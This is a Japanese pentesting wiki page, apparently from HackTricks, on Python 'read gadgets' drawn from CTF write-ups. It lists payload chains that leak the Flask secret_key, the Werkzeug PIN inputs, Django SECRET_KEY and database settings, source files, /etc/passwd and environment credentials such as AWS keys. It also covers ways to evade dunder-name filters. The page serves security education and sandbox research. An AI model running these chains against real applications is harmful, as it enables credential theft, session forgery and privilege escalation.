# Python Internal Read Gadgets

## 基本情報

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) や [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) などのさまざまな脆弱性により、**Python の内部データを読み取れるものの、コードを実行できない**場合があります。そのため、pentester はこれらの読み取り権限を最大限に活用し、**機密性の高い権限を取得して脆弱性をエスカレート**する必要があります。

### Flask - secret key の読み取り

Flask アプリケーションのメインページには、おそらくこの **secret が設定されている** **`app`** グローバルオブジェクトがあります。
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
この場合、[**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html) にある **global objects に access** する任意の gadget を使うだけで、この object に access できます。

**vulnerability が別の python file にある場合**、main file に到達して **global object `app.secret_key` に access** するために、files を traverse する gadget が必要です。この key を知ることで [**privileges を escalate**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) できます。

[この writeup](https://ctftime.org/writeup/36082) にある次のような payload:<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
この payload を使用して **`app.secret_key` を読み取る**。元の bug に write primitive（例: class pollution）も含まれている場合は、同じ path を使ってこれを置き換え、より高い権限を持つ Flask cookie に署名できる。

### Werkzeug - machine_id と node uuid

[**この writeup の payload を使用する**](https://vozec.fr/writeups/tweedle-dum-dee/)ことで、**machine_id** と **uuid** node にアクセスできる。これらは、[**Werkzeug pin を生成する**](../../network-services-pentesting/pentesting-web/werkzeug.md)ため、および **debug mode** が有効な場合に `/console` の Python console にアクセスするために必要な **private bits** である:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Webページで**error**を発生させることで、**app.py**の**serverのローカルパス**を取得でき、その**パスが表示される**場合があります。

脆弱性が別のPythonファイルにある場合は、メインのPythonファイルからオブジェクトにアクセスするために、前述のFlask trickを確認してください。

### Django - SECRET_KEY and settings module

Djangoのsettingsオブジェクトは、アプリケーションの起動後に`sys.modules`へキャッシュされます。読み取りプリミティブだけでも、**SECRET_KEY**、fallback keys、データベース認証情報、署名用saltをleakできます:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
脆弱な gadget が別の module にある場合は、まず globals をたどる：
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` は現在の `SECRET_KEY` と同じくらい価値があります。ローテーション中も、古い署名済みの値を検証できるためです。<sup>[[1]](#references)</sup> また、影響が cookie forgery のみに限定されるのか、それともさらに強力なものなのかを素早く判断できるよう、`SESSION_ENGINE` と `SESSION_SERIALIZER` も leak させます。Web への影響の詳細については、[**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md) を確認してください。

### Module loader gadgets - source code と files の読み取り

Loaded Python modules は通常 `__loader__` を保持しています。File-backed loaders は頻繁に `get_source()` と `get_data()` を公開しており、すでに module object に到達できるものの `open()` には到達できない場合に、完全な **read-only primitives** として利用できます。
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
これは **config modules、blueprints、helper files、hidden routes** を dump し、API keys、DSNs、flag paths、追加のgadget entry pointsを回収するのに非常に有用です。

subclass enumerationしかない場合は、indexをhard-codeするのではなく、名前でloaderを検索します。
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

Generator/coroutine objectを作成または取得できる場合、そのframeから、関数の`__globals__` gadgetを必要とせずにglobalsがleakする可能性があります。これは、dunder名のみをブロックし、`gi_frame`、`ag_frame`、`cr_frame`、`f_globals`などのframe属性を見落としているfilterに対して有効です：
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
frame globals を取得したら、他の gadgets（`sys.modules`、settings objects、`os.environ` など）とまったく同じように続行します。最近の sandbox escapes では、`gi_frame` と `f_globals` が dunder attributes ではなく、単純な deny-list をすり抜けることが多いため、この手法が何度も再発見されています。

### 読み込まれたモジュール経由の環境変数 / cloud creds

多くの jail では、どこかで `os` または `sys` が import されています。到達可能な任意の関数の `__init__.__globals__` を悪用して、すでに import されている `os` module に pivot し、API token、cloud key、flag を含む **environment variables** をダンプできます。
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
サブクラスのインデックスがフィルタリングされている場合は、loaders を使用します。
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
環境変数は、read から完全な compromise へ移行するために必要な唯一の secret であることが頻繁にあります（cloud IAM keys、database URLs、signing keys など）。

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)、影響を受けるバージョン `<0.61.0`）では、細工した component requests を通じた **class pollution** が可能でした。`__init__.__globals__` のような property path により、component-module globals や imported modules に到達できました。この advisory では、read-only exploit ではなく、Django の `SECRET_KEY` および `os.environ` 内の値を上書きする手法が示されています。<sup>[[5]](#references)</sup> 別の bug によって同じ object graph への read access が得られる場合、code execution を必要とせずに、それらの globals から configuration や credentials が漏洩する可能性があります。

### chaining 用の Gadget collections

最近の CTF や pyjail research では、attribute access と subclass enumeration だけで構築された、信頼性の高い read chains が示されています。[**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) のような community-maintained lists には、objects から `__globals__`、`sys.modules`、最終的に sensitive data へ traverse するために組み合わせられる、数百種類の最小限の gadgets が catalog されています。<sup>[[2]](#references)</sup> `os._wrap_close`、`FileLoader`、`warnings.catch_warnings` などの位置は Python versions や追加で imported された libraries によって変化するため、raw subclass indexes よりも **attribute/name based searches** を優先してください。

## References

- [1] [Django の cryptographic signing ドキュメント](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, RCE、XSS、DoS および Authentication Bypass につながる脆弱性 (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
